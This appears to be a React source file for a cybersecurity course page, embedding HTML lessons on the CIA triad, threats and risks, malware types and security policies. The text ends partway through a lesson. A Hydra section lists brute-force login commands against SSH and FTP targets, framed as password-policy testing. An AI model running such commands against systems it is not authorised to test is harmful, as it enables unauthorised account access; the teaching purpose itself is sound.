import React, { useState, useMemo, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { useTheme } from '../contexts/ThemeContext';
import { askLLM, ChatMessage } from '../services/llm';
import { Paperclip, Mic, Send, BookOpen, FileText, Search, CheckCircle, ChevronDown, ChevronRight, PlayCircle, Terminal, Code } from 'lucide-react';
import { clsx } from 'clsx';

// --- Types ---

interface Lesson {
  title: string;
  content: string; // HTML content
  duration?: string;
  syntax?: { title: string; content: string }[];
  terminalCommands?: string[];
}

interface Module {
  id: string; // e.g., 'module-1'
  title: string;
  duration: string;
  description: string;
  lessons: Lesson[];
  videoLinks?: { label: string; url: string }[];
}

interface Resource {
  type: 'video' | 'document';
  title: string;
  duration: string;
  description: string;
}

// --- Data ---

const resources: Resource[] = [
  {
    type: 'video',
    title: 'Cyber Security Overview',
    duration: '15 min',
    description: 'Introduction to the world of Cyber Security'
  },
  {
    type: 'document',
    title: 'Course Handbook',
    duration: '20 min read',
    description: 'Guide to course structure and requirements'
  }
];

const courseData: Module[] = [
  {
    id: 'module-1',
    title: 'Module 1: Cyber Security Fundamentals',
    duration: '2 weeks',
    description: 'Introduction to Cyber Security concepts, importance, and basic principles.',
    lessons: [
      {
        title: 'What is Cyber Security?',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Definition</h2>
          <p class="mb-4 text-gray-300">Cyber Security is the practice of protecting computers, networks, servers, mobile devices, and data from unauthorized access, attacks, damage, or theft using technologies, processes, and policies.</p>
          
          <div class="p-4 rounded-lg border border-yellow-500/30 bg-yellow-500/10 mb-6">
            <p class="font-medium text-yellow-500 mb-1">In simple words,</p>
            <p class="text-gray-300">👉 Cyber Security means keeping digital information safe from hackers and cyber attacks.</p>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Cyber Security is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Protects personal data (passwords, bank details, Aadhaar, PAN, etc.)</li>
            <li>Secures business information and customer data</li>
            <li>Prevents financial loss</li>
            <li>Protects government and critical infrastructure</li>
            <li>Ensures privacy and trust in digital systems</li>
          </ul>
          <p class="mb-6 text-gray-300">With the increase in internet usage, cyber attacks are also increasing, making cyber security essential.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Types of Cyber Security</h2>
          
          <div class="space-y-4 mb-6">
            <div>
              <h3 class="text-lg font-semibold mb-1 text-blue-400">1. Network Security</h3>
              <p class="mb-1 text-gray-300">Protects computer networks from intruders.</p>
              <ul class="list-disc pl-6 text-gray-400 text-sm">
                <li>Firewalls, IDS/IPS, VPNs</li>
              </ul>
            </div>

            <div>
              <h3 class="text-lg font-semibold mb-1 text-blue-400">2. Information Security</h3>
              <p class="mb-1 text-gray-300">Protects data from unauthorized access.</p>
              <ul class="list-disc pl-6 text-gray-400 text-sm">
                <li>Encryption, Access control, Data backup</li>
              </ul>
            </div>

            <div>
              <h3 class="text-lg font-semibold mb-1 text-blue-400">3. Application Security</h3>
              <p class="mb-1 text-gray-300">Protects software and applications from vulnerabilities.</p>
              <ul class="list-disc pl-6 text-gray-400 text-sm">
                <li>Secure coding, Patch management, WAF</li>
              </ul>
            </div>

            <div>
              <h3 class="text-lg font-semibold mb-1 text-blue-400">4. Endpoint Security</h3>
              <p class="mb-1 text-gray-300">Protects devices like laptops, mobiles, and servers.</p>
              <ul class="list-disc pl-6 text-gray-400 text-sm">
                <li>Antivirus, Endpoint Detection & Response (EDR)</li>
              </ul>
            </div>

            <div>
              <h3 class="text-lg font-semibold mb-1 text-blue-400">5. Cloud Security</h3>
              <p class="mb-1 text-gray-300">Protects data and services hosted on cloud platforms.</p>
              <ul class="list-disc pl-6 text-gray-400 text-sm">
                <li>IAM, Secure cloud configurations</li>
              </ul>
            </div>
          </div>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Common Security Terms',
            content: 'Threat: A potential danger\nVulnerability: A weakness in the system\nRisk: The potential for loss or damage'
          },
          {
            title: 'Useful Resources',
            content: 'NIST Cybersecurity Framework: https://www.nist.gov/cyberframework\nOWASP Top 10: https://owasp.org/www-project-top-ten/'
          }
        ],
        terminalCommands: ['help', 'whoami', 'date', 'echo "Hello Cyber Security"']
      },
      {
        title: 'CIA Triad (Confidentiality, Integrity, Availability)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">What is the CIA Triad?</h2>
          <p class="mb-4 text-gray-300">The CIA Triad is a foundational model in cybersecurity that defines three core principles used to guide policies, procedures, and security controls to protect information systems. These principles help ensure that data and systems are kept secure from unauthorized access, tampering, loss, or downtime.</p>
          
          <div class="space-y-6">
            <!-- Confidentiality -->
            <div class="p-4 rounded-lg border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold mb-2 text-blue-400">1. Confidentiality</h3>
              <p class="mb-3 text-gray-300">Confidentiality means keeping information secret and accessible only to people who are supposed to see it. It ensures that sensitive data isn’t disclosed to unauthorized users, whether accidentally or intentionally.</p>
              
              <div class="mb-3">
                <h4 class="font-medium text-white mb-1">Key Points:</h4>
                <ul class="list-disc pl-5 text-gray-400 text-sm space-y-1">
                  <li>Protects personal, financial, and organizational data from unauthorized disclosure.</li>
                  <li>Controls like passwords, encryption, access permissions, and multi-factor authentication help ensure confidentiality.</li>
                  <li>Without confidentiality, information such as emails, medical records, or financial statements could be read or copied by attackers.</li>
                </ul>
              </div>
              
              <div class="bg-blue-500/10 p-3 rounded border border-blue-500/20">
                <p class="text-sm text-blue-300"><span class="font-semibold">Real-World Example:</span> Your email service encrypts your messages so only you (and intended recipients) can read them.</p>
              </div>
            </div>

            <!-- Integrity -->
            <div class="p-4 rounded-lg border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold mb-2 text-green-400">2. Integrity</h3>
              <p class="mb-3 text-gray-300">Integrity ensures that data remains accurate, consistent, and trustworthy. It prevents unauthorized or unintentional changes to data — whether by hackers, malware, or even human error.</p>
              
              <div class="mb-3">
                <h4 class="font-medium text-white mb-1">Key Points:</h4>
                <ul class="list-disc pl-5 text-gray-400 text-sm space-y-1">
                  <li>Protects information from being tampered with or corrupted.</li>
                  <li>Techniques like hashing, digital signatures, version control, and validation checks ensure that if data changes, the change is legitimate and traceable.</li>
                  <li>If integrity is broken, data may be unreliable and could lead to dangerous consequences (e.g., falsified financial records).</li>
                </ul>
              </div>
              
              <div class="bg-green-500/10 p-3 rounded border border-green-500/20">
                <p class="text-sm text-green-300"><span class="font-semibold">Real-World Example:</span> Financial transaction records in a bank must not be altered without proper authorization — integrity ensures that.</p>
              </div>
            </div>

            <!-- Availability -->
            <div class="p-4 rounded-lg border border-purple-500/20 bg-purple-500/5">
              <h3 class="text-lg font-semibold mb-2 text-purple-400">3. Availability</h3>
              <p class="mb-3 text-gray-300">Availability means that authorized users can access data and systems when they need them without unnecessary delay.</p>
              
              <div class="mb-3">
                <h4 class="font-medium text-white mb-1">Key Points:</h4>
                <ul class="list-disc pl-5 text-gray-400 text-sm space-y-1">
                  <li>Protects against outages, service disruptions, or data loss.</li>
                  <li>Redundancy (backup systems), regular maintenance, disaster recovery plans, and protections against DoS/DDoS attacks help ensure availability.</li>
                  <li>A system that is secure but unavailable is useless — users must be able to access information reliably.</li>
                </ul>
              </div>
              
              <div class="bg-purple-500/10 p-3 rounded border border-purple-500/20">
                <p class="text-sm text-purple-300"><span class="font-semibold">Real-World Example:</span> A website that goes down during peak hours loses availability — users cannot access its services.</p>
              </div>
            </div>
          </div>

          <div class="mt-8">
            <h2 class="text-xl font-semibold mb-3 text-white">Why the CIA Triad Matters</h2>
            <p class="mb-3 text-gray-300">The CIA Triad is often called the cornerstone of information security because most security objectives map back to at least one of its principles. It helps teams:</p>
            <ul class="list-none space-y-2 text-gray-300">
              <li class="flex items-center gap-2"><span class="text-green-500">✔</span> Evaluate and prioritize security risks</li>
              <li class="flex items-center gap-2"><span class="text-green-500">✔</span> Design security policies and architecture</li>
              <li class="flex items-center gap-2"><span class="text-green-500">✔</span> Balance protection with usability and business needs</li>
            </ul>
          </div>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Deep Dive Resources',
            content: `Imperva — CIA Triad Overview (Detailed Explanation)
👉 https://www.imperva.com/learn/application-security/cia-triad/

Fortinet — What is CIA Triad and Why It’s Important
👉 https://www.fortinet.com/resources/cyberglossary/cia-triad

GeeksforGeeks — CIA Triad in Cybersecurity (with risks & protections)
👉 https://www.geeksforgeeks.org/the-cia-triad-in-cryptography/

Coursera Article — CIA Triad in Cybersecurity (learning resource)
👉 https://www.coursera.org/in/articles/cia-triad

ManageEngine Academy — CIA Triad and IT Security (concept introduction)
👉 https://www.manageengine.com/academy/cia-triad.html

YouTube Video — CIA Triad Explained (visual learning)
👉 https://www.youtube.com/watch?v=_WjExtaAIk0`
          }
        ],
        terminalCommands: ['help', 'md5sum', 'sha256sum']
      },
      {
        title: 'Threats, Vulnerabilities, and Risks',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">In cybersecurity, not every problem is an attack, and not every weakness causes damage. To properly protect systems, security professionals must clearly understand what can attack, what can be exploited, and what damage can occur.</p>
          <p class="mb-6 text-gray-300">This is where the concepts of <strong class="text-white">Threats</strong>, <strong class="text-white">Vulnerabilities</strong>, and <strong class="text-white">Risks</strong> come into play. These three terms are closely connected and form the foundation of risk management in cybersecurity.</p>

          <!-- 1. Threat -->
          <div class="mb-8">
            <h2 class="text-xl font-semibold mb-3 text-red-400">1. Threat</h2>
            <div class="p-4 rounded-lg border border-red-500/20 bg-red-500/5 mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">What is a Threat?</h3>
              <p class="mb-3 text-gray-300">A threat is any potential event, action, or actor that can cause harm to a computer system, network, application, or data. A threat does not always cause damage — it only represents the possibility of damage.</p>
              <p class="text-sm text-gray-400">Threats can be: <strong>Intentional</strong> (planned attacks), <strong>Unintentional</strong> (accidents), or <strong>Natural</strong> (environmental causes).</p>
            </div>

            <h3 class="text-lg font-semibold mb-3 text-white">Types of Threats</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div class="bg-[#252526] p-3 rounded border border-gray-700">
                <h4 class="font-bold text-red-300 mb-1">1. Cyber Threats</h4>
                <p class="text-sm text-gray-400 mb-2">Deliberate attacks using digital means.</p>
                <ul class="list-disc pl-4 text-xs text-gray-500">
                  <li>Hackers, Cybercriminals, Hacktivists</li>
                  <li>Phishing, Malware, DDoS</li>
                </ul>
              </div>
              <div class="bg-[#252526] p-3 rounded border border-gray-700">
                <h4 class="font-bold text-orange-300 mb-1">2. Insider Threats</h4>
                <p class="text-sm text-gray-400 mb-2">From people within the organization.</p>
                <ul class="list-disc pl-4 text-xs text-gray-500">
                  <li>Disgruntled/Careless employees</li>
                  <li>Contractors with excess permissions</li>
                </ul>
              </div>
              <div class="bg-[#252526] p-3 rounded border border-gray-700">
                <h4 class="font-bold text-yellow-300 mb-1">3. Natural Threats</h4>
                <p class="text-sm text-gray-400 mb-2">Not cyber-based but affect systems.</p>
                <ul class="list-disc pl-4 text-xs text-gray-500">
                  <li>Floods, Fires, Earthquakes</li>
                  <li>Power outages</li>
                </ul>
              </div>
              <div class="bg-[#252526] p-3 rounded border border-gray-700">
                <h4 class="font-bold text-blue-300 mb-1">4. Accidental Threats</h4>
                <p class="text-sm text-gray-400 mb-2">Human error without malicious intent.</p>
                <ul class="list-disc pl-4 text-xs text-gray-500">
                  <li>Misconfigurations, Deleting files</li>
                  <li>Weak password practices</li>
                </ul>
              </div>
            </div>
            <div class="mt-3 bg-red-900/20 border-l-4 border-red-500 p-2">
              <p class="text-sm text-red-200"><span class="font-bold">Key Point:</span> A threat does not need to exploit anything immediately. It simply represents a potential danger.</p>
            </div>
          </div>

          <!-- 2. Vulnerability -->
          <div class="mb-8">
            <h2 class="text-xl font-semibold mb-3 text-yellow-400">2. Vulnerability</h2>
            <div class="p-4 rounded-lg border border-yellow-500/20 bg-yellow-500/5 mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">What is a Vulnerability?</h3>
              <p class="mb-3 text-gray-300">A vulnerability is a weakness, flaw, or gap in a system that can be exploited by a threat. Vulnerabilities exist due to poor design, improper configuration, outdated software, or lack of security controls.</p>
              <p class="text-sm text-yellow-200/80 italic">"If a threat is the attacker, a vulnerability is the open door."</p>
            </div>

            <h3 class="text-lg font-semibold mb-3 text-white">Common Sources</h3>
            <ul class="space-y-2 mb-4">
              <li class="bg-[#252526] p-2 rounded flex gap-3 items-start">
                <span class="text-yellow-500 font-bold">Software:</span>
                <span class="text-gray-400 text-sm">Bugs, unpatched OS, SQL Injection flaws.</span>
              </li>
              <li class="bg-[#252526] p-2 rounded flex gap-3 items-start">
                <span class="text-yellow-500 font-bold">Configuration:</span>
                <span class="text-gray-400 text-sm">Open ports, default passwords, misconfigured firewalls.</span>
              </li>
              <li class="bg-[#252526] p-2 rounded flex gap-3 items-start">
                <span class="text-yellow-500 font-bold">Hardware:</span>
                <span class="text-gray-400 text-sm">Outdated routers, unsupported IoT devices.</span>
              </li>
              <li class="bg-[#252526] p-2 rounded flex gap-3 items-start">
                <span class="text-yellow-500 font-bold">Human:</span>
                <span class="text-gray-400 text-sm">Poor awareness, phishing victims, password reuse.</span>
              </li>
            </ul>
            <div class="mt-3 bg-yellow-900/20 border-l-4 border-yellow-500 p-2">
              <p class="text-sm text-yellow-200"><span class="font-bold">Key Point:</span> A vulnerability by itself does not cause damage unless a threat exploits it.</p>
            </div>
          </div>

          <!-- 3. Risk -->
          <div class="mb-8">
            <h2 class="text-xl font-semibold mb-3 text-orange-400">3. Risk</h2>
            <div class="p-4 rounded-lg border border-orange-500/20 bg-orange-500/5 mb-4">
              <h3 class="text-lg font-semibold mb-2 text-white">What is Risk?</h3>
              <p class="mb-3 text-gray-300">Risk is the likelihood that a threat will exploit a vulnerability and cause damage or loss. It combines probability and impact.</p>
              <div class="bg-black/30 p-3 rounded text-center font-mono text-orange-300 border border-orange-500/30">
                Risk = Threat × Vulnerability × Impact
              </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-3 gap-3 mb-4">
              <div class="p-3 rounded bg-green-900/10 border border-green-500/20 text-center">
                <h4 class="font-bold text-green-400">Low Risk</h4>
                <p class="text-xs text-gray-400 mt-1">Vuln exists, No active threat, Low impact.</p>
              </div>
              <div class="p-3 rounded bg-yellow-900/10 border border-yellow-500/20 text-center">
                <h4 class="font-bold text-yellow-400">Medium Risk</h4>
                <p class="text-xs text-gray-400 mt-1">Vuln exists, Possible threat, Moderate impact.</p>
              </div>
              <div class="p-3 rounded bg-red-900/10 border border-red-500/20 text-center">
                <h4 class="font-bold text-red-400">High Risk</h4>
                <p class="text-xs text-gray-400 mt-1">Vuln exists, Active threat, High impact.</p>
              </div>
            </div>
          </div>

          <!-- Relationship & Conclusion -->
          <div class="mb-6">
            <h2 class="text-xl font-semibold mb-3 text-white">Relationship & Real-World Scenario</h2>
            <div class="bg-[#252526] p-4 rounded border border-gray-600">
              <ul class="list-disc pl-5 text-gray-300 space-y-2 mb-4">
                <li>A <span class="text-red-400">threat</span> exploits a <span class="text-yellow-400">vulnerability</span>.</li>
                <li>This exploitation creates a <span class="text-orange-400">risk</span>.</li>
                <li>Eliminating vulnerabilities reduces risk.</li>
              </ul>
              <div class="bg-black/20 p-3 rounded">
                <h4 class="font-semibold text-white mb-2">Example: Company Website</h4>
                <div class="grid grid-cols-1 gap-2 text-sm">
                  <div class="flex items-center gap-2"><span class="px-2 py-0.5 rounded bg-yellow-500/20 text-yellow-300 text-xs border border-yellow-500/30">Vulnerability</span> <span class="text-gray-400">Uses outdated CMS software</span></div>
                  <div class="flex items-center gap-2"><span class="px-2 py-0.5 rounded bg-red-500/20 text-red-300 text-xs border border-red-500/30">Threat</span> <span class="text-gray-400">Attackers scan for outdated CMS</span></div>
                  <div class="flex items-center gap-2"><span class="px-2 py-0.5 rounded bg-orange-500/20 text-orange-300 text-xs border border-orange-500/30">Risk</span> <span class="text-gray-400">Website gets hacked and defaced</span></div>
                </div>
                <p class="mt-2 text-green-400 text-sm">➡ Solution: Updating the CMS removes the vulnerability and reduces risk.</p>
              </div>
            </div>
          </div>

          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Why This Matters</h2>
            <p class="text-gray-300 mb-2">Understanding these concepts helps professionals design secure architectures, perform risk assessments, and prioritize patching. It is fundamental for:</p>
            <div class="flex flex-wrap gap-2">
              <span class="px-3 py-1 bg-blue-500/10 text-blue-300 rounded-full text-sm border border-blue-500/20">Ethical Hacking</span>
              <span class="px-3 py-1 bg-blue-500/10 text-blue-300 rounded-full text-sm border border-blue-500/20">Penetration Testing</span>
              <span class="px-3 py-1 bg-blue-500/10 text-blue-300 rounded-full text-sm border border-blue-500/20">Compliance & Audits</span>
            </div>
          </div>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Reference URLs for Deeper Knowledge',
            content: `IBM — Cybersecurity Risk
👉 https://www.ibm.com/topics/cybersecurity-risk

OWASP — Threat Modeling
👉 https://owasp.org/www-community/Threat_Modeling

Fortinet — Cyber Risk Glossary
👉 https://www.fortinet.com/resources/cyberglossary/cyber-risk

GeeksforGeeks — Difference between Threat, Vulnerability, and Risk
👉 https://www.geeksforgeeks.org/difference-between-threat-vulnerability-and-risk/

NIST — Risk Management Framework
👉 https://www.nist.gov/cyberframework/risk-management-framework

YouTube — Threat, Vulnerability, and Risk Explained
👉 https://www.youtube.com/watch?v=ZC2D7ZlG6L4`
          }
        ],
        terminalCommands: ['help']
      },
      {
        title: 'Malware Types (Virus, Worm, Trojan, Ransomware)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction to Malware</h2>
          <p class="mb-4 text-gray-300">Malware is a short form of malicious software. It refers to any software or code intentionally designed to damage, disrupt, spy on, steal from, or gain unauthorized access to computer systems, networks, or data. Malware is one of the most common and dangerous tools used by attackers in cyber security incidents. It can affect personal computers, servers, mobile devices, cloud systems, and even critical infrastructure.</p>
          <p class="mb-6 text-gray-300">Malware does not always behave the same way. Some malware silently steals information, some spreads rapidly across networks, and others lock systems completely and demand money. Understanding different types of malware is critical for identifying attacks, preventing infections, and responding correctly during incidents.</p>

          <div class="p-3 border border-red-500/20 bg-red-500/5 rounded-lg mb-4">
            <h3 class="text-lg font-semibold mb-1 text-red-400">⭐ 1. Virus</h3>
            <p class="mb-2 text-gray-300">A computer virus is a type of malware that attaches itself to a legitimate file or program and spreads when that file is executed by the user. Just like a biological virus needs a host to survive, a computer virus requires a host file or application to activate and propagate. Viruses usually rely on human action, such as opening an infected file, running a malicious program, or inserting an infected USB drive.</p>
            <p class="mb-2 text-gray-300">Once activated, a virus can perform a wide range of malicious actions, including corrupting files, modifying system settings, slowing down performance, displaying unwanted messages, or deleting critical data. Some advanced viruses can even disable antivirus software to avoid detection. Because viruses need user interaction, social engineering techniques like fake downloads or email attachments are commonly used to spread them.</p>
            <p class="text-sm text-gray-400">Example Scenario: A user downloads a cracked software file from an untrusted website. When the user installs it, the hidden virus activates and starts corrupting system files.</p>
          </div>

          <div class="p-3 border border-red-500/20 bg-red-500/5 rounded-lg mb-4">
            <h3 class="text-lg font-semibold mb-1 text-red-400">⭐ 2. Worm</h3>
            <p class="mb-2 text-gray-300">A worm is a standalone type of malware that does not require a host file or user interaction to spread. Worms are extremely dangerous because they can automatically replicate themselves and spread across networks by exploiting vulnerabilities in operating systems, services, or network protocols.</p>
            <p class="mb-2 text-gray-300">Once inside a system, a worm scans the network for other vulnerable devices and infects them without any user involvement. This rapid self-propagation can consume massive network bandwidth, overload servers, and cause large-scale outages. Worms are often used as delivery mechanisms to install other types of malware, such as backdoors or ransomware.</p>
            <p class="mb-2 text-gray-300">Historically, worms have caused some of the largest cyber incidents, affecting millions of computers worldwide within hours. Their ability to spread silently and quickly makes them particularly difficult to control once released.</p>
            <p class="text-sm text-gray-400">Example Scenario: A worm exploits an unpatched Windows vulnerability and automatically spreads across all computers connected to the same corporate network.</p>
          </div>

          <div class="p-3 border border-red-500/20 bg-red-500/5 rounded-lg mb-4">
            <h3 class="text-lg font-semibold mb-1 text-red-400">⭐ 3. Trojan (Trojan Horse)</h3>
            <p class="mb-2 text-gray-300">A Trojan, or Trojan Horse, is malware that disguises itself as legitimate or useful software to trick users into installing it. Unlike viruses and worms, Trojans do not replicate themselves. Instead, they rely heavily on deception and social engineering to gain entry into systems.</p>
            <p class="mb-2 text-gray-300">Once installed, a Trojan can perform various malicious activities such as creating backdoors for attackers, stealing sensitive information, logging keystrokes, spying on users, or giving attackers remote control over the infected system. Trojans are commonly delivered through fake software updates, pirated software, email attachments, or malicious links.</p>
            <p class="mb-2 text-gray-300">Trojans are especially dangerous because users often install them willingly, believing they are safe. Since Trojans may appear to function normally, they can remain undetected for long periods while silently compromising security.</p>
            <p class="text-sm text-gray-400">Example Scenario: A fake antivirus program claims to protect the system but actually steals passwords and sends them to attackers.</p>
          </div>

          <div class="p-3 border border-red-500/20 bg-red-500/5 rounded-lg mb-4">
            <h3 class="text-lg font-semibold mb-1 text-red-400">⭐ 4. Ransomware</h3>
            <p class="mb-2 text-gray-300">Ransomware is one of the most destructive and financially damaging types of malware. Its primary goal is to deny access to data or systems by encrypting files and then demanding a ransom payment from the victim in exchange for the decryption key. Ransomware attacks can target individuals, businesses, hospitals, and government organizations.</p>
            <p class="mb-2 text-gray-300">Once ransomware infects a system, it quickly encrypts important files such as documents, databases, images, and backups. Victims are then shown a ransom note demanding payment, often in cryptocurrency, within a limited time frame. Even if payment is made, there is no guarantee that attackers will restore access.</p>
            <p class="mb-2 text-gray-300">Modern ransomware attacks are often part of double extortion schemes, where attackers not only encrypt data but also steal it and threaten to publish it if the ransom is not paid. This makes ransomware a severe threat to data confidentiality, integrity, and availability.</p>
            <p class="text-sm text-gray-400">Example Scenario: A company employee clicks on a phishing email link, triggering ransomware that encrypts all company servers overnight.</p>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">⭐ Comparison of Malware Types (Conceptual Understanding)</h3>
          <ul class="list-disc pl-5 text-gray-300 space-y-1 mb-6">
            <li><span class="text-white">Virus:</span> Needs user action and a host file</li>
            <li><span class="text-white">Worm:</span> Spreads automatically across networks</li>
            <li><span class="text-white">Trojan:</span> Disguises itself as legitimate software</li>
            <li><span class="text-white">Ransomware:</span> Encrypts data and demands payment</li>
          </ul>
          <p class="mb-6 text-gray-300">Each malware type targets systems differently, but all aim to compromise security.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Understanding Malware Types Is Important</h2>
          <p class="mb-2 text-gray-300">Knowing how different malware behaves helps cybersecurity professionals:</p>
          <ul class="list-disc pl-5 text-gray-300 space-y-1 mb-4">
            <li>Detect infections early</li>
            <li>Choose the right defense mechanisms</li>
            <li>Respond effectively to incidents</li>
            <li>Educate users to avoid common attack methods</li>
            <li>Design secure systems and networks</li>
          </ul>
          <p class="text-gray-300">This knowledge is essential for ethical hacking, malware analysis, incident response, and cyber defense roles.</p>
        `,
        duration: '25 min',
        syntax: [
          {
            title: 'Kali Linux Tools – Tool-Based Learning',
            content: `🛠 Tool 1: ClamAV

Related Malware Type: Virus

What is ClamAV?
ClamAV is an open-source antivirus tool available in Kali Linux. It is used to scan files, directories, and systems for known viruses and malware signatures. It helps security professionals and students understand how virus detection works using signature-based scanning.

Use Case:
Detect file-based viruses
Scan downloads, USB drives, and directories
Learn basic malware detection techniques

Basic Commands:
clamscan file.txt
clamscan -r /home/kali/
clamscan --infected --remove -r /directory`
          }
        ]
      },
      {
        title: 'Security Policies & Best Practices',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">In cybersecurity, technology alone cannot protect systems. Even the most advanced firewalls, antivirus software, and encryption mechanisms can fail if users and organizations do not follow proper security policies and best practices. Security policies define what must be done, while best practices describe how it should be done to protect information assets. Together, they form the backbone of an organization’s security posture.</p>
          <p class="mb-6 text-gray-300">Security policies and best practices help reduce human error, standardize security behavior, ensure legal compliance, and provide a structured approach to handling sensitive data, systems, and networks. They are especially critical in organizations where multiple users interact with shared systems.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What Are Security Policies?</h2>
          <p class="mb-4 text-gray-300">A security policy is a formal, written document that defines rules, responsibilities, and procedures for protecting an organization’s information systems and data. These policies act as a guideline for employees, administrators, and security teams, clearly stating what is allowed and what is not.</p>
          <p class="mb-4 text-gray-300">Security policies are not optional rules — they are mandatory controls enforced to maintain confidentiality, integrity, and availability. They also serve as a reference during audits, investigations, and incident response.</p>

          <div class="p-4 rounded-lg border border-blue-500/20 bg-blue-500/5 mb-5">
            <h3 class="text-lg font-semibold mb-2 text-blue-400">Examples of Common Security Policies</h3>
            <ul class="list-disc pl-6 text-gray-300 space-y-1">
              <li>Password policy</li>
              <li>Acceptable use policy</li>
              <li>Data protection policy</li>
              <li>Access control policy</li>
              <li>Incident response policy</li>
            </ul>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Types of Security Policies</h2>
          <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
            <div class="p-3 rounded-lg bg-[#252526] border border-gray-700">
              <h3 class="text-lg font-semibold text-white mb-1">Organizational Policies</h3>
              <p class="text-sm text-gray-300">High-level policies created by management that define overall security goals and apply to all employees.</p>
            </div>
            <div class="p-3 rounded-lg bg-[#252526] border border-gray-700">
              <h3 class="text-lg font-semibold text-white mb-1">System-Specific Policies</h3>
              <p class="text-sm text-gray-300">Policies for specific systems (databases, servers, networks) that define configuration standards, access rules, and usage limitations.</p>
            </div>
            <div class="p-3 rounded-lg bg-[#252526] border border-gray-700">
              <h3 class="text-lg font-semibold text-white mb-1">Issue-Specific Policies</h3>
              <p class="text-sm text-gray-300">Policies addressing specific topics like email usage, internet browsing, remote access, or USB device usage.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">What Are Security Best Practices?</h2>
          <p class="mb-4 text-gray-300">Best practices are proven methods and techniques that are widely accepted as effective in securing systems. While policies define rules, best practices guide daily actions and behaviors that reduce vulnerabilities and prevent attacks.</p>
          <p class="mb-6 text-gray-300">Best practices evolve continuously as new threats emerge, which means organizations must regularly update them to stay secure.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Common Security Best Practices (Detailed)</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold text-green-400 mb-1">Strong Password Management</h3>
              <p class="text-gray-300 text-sm">Create complex passwords, avoid reuse, and change them regularly. Weak passwords are frequently exploited in brute-force and credential-stuffing attacks.</p>
            </div>
            <div class="p-3 rounded border border-yellow-500/20 bg-yellow-500/5">
              <h3 class="text-lg font-semibold text-yellow-400 mb-1">Regular Software Updates and Patching</h3>
              <p class="text-gray-300 text-sm">Apply security updates promptly to close known vulnerabilities that attackers can exploit.</p>
            </div>
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">Principle of Least Privilege</h3>
              <p class="text-gray-300 text-sm">Grant only the minimum access required to perform tasks. This limits potential damage if an account is compromised.</p>
            </div>
            <div class="p-3 rounded border border-purple-500/20 bg-purple-500/5">
              <h3 class="text-lg font-semibold text-purple-400 mb-1">Security Awareness Training</h3>
              <p class="text-gray-300 text-sm">Educate employees about phishing, social engineering, and safe online behavior. Human awareness is a strong defense layer.</p>
            </div>
            <div class="p-3 rounded border border-orange-500/20 bg-orange-500/5">
              <h3 class="text-lg font-semibold text-orange-400 mb-1">Backup and Recovery Planning</h3>
              <p class="text-gray-300 text-sm">Perform regular backups to ensure data availability during ransomware incidents, hardware failures, or accidental deletions.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Policy Enforcement and Monitoring</h2>
          <p class="mb-3 text-gray-300">Security policies are effective only when enforced and monitored. This includes logging user activities, auditing access, and continuously monitoring systems for suspicious behavior. Tools in Kali Linux are often used by security teams to test whether policies are strong enough and correctly implemented.</p>
          <p class="mb-6 text-gray-300">For example, password policies can be tested using <span class="font-semibold text-white">Hydra</span> in Kali Linux under controlled conditions to verify resistance to brute-force attempts and confirm account lockout or rate-limiting is correctly enforced.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Security Policies and Best Practices Matter</h2>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-2">
            <li>Employees may unknowingly expose sensitive data without clear rules</li>
            <li>Systems may remain misconfigured without standard procedures</li>
            <li>Compliance requirements may be violated without governance</li>
            <li>Attacks may go undetected for long periods without monitoring</li>
          </ul>
          <p class="text-gray-300">Strong policies combined with good practices create a human + technical security layer, significantly reducing organizational risk.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Policy Testing & Enforcement',
            content: `🛠 Tool Name: Hydra

Related Concept: Password Policy & Authentication Best Practices

What is Hydra?
Hydra is a fast and flexible login cracking tool available in Kali Linux. From a defensive and educational perspective, it is used to test password strength and authentication policies. By simulating brute-force attacks, security professionals can identify weak passwords and improve security policies.

Why This Tool Fits This Topic:
Password policies are a critical part of security best practices. Hydra helps verify whether:
Password complexity rules are strong
Login systems are resistant to brute-force attacks
Account lockout policies are correctly enforced

Basic Commands
Test SSH Login Strength
hydra -l user -P passwords.txt ssh://target_ip

Test FTP Login
hydra -L users.txt -P passwords.txt ftp://target_ip

Specify Number of Attempts
hydra -t 4 -l admin -P pass.txt ssh://target_ip`
          }
        ]
      },
      {
        title: 'Authentication vs Authorization',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
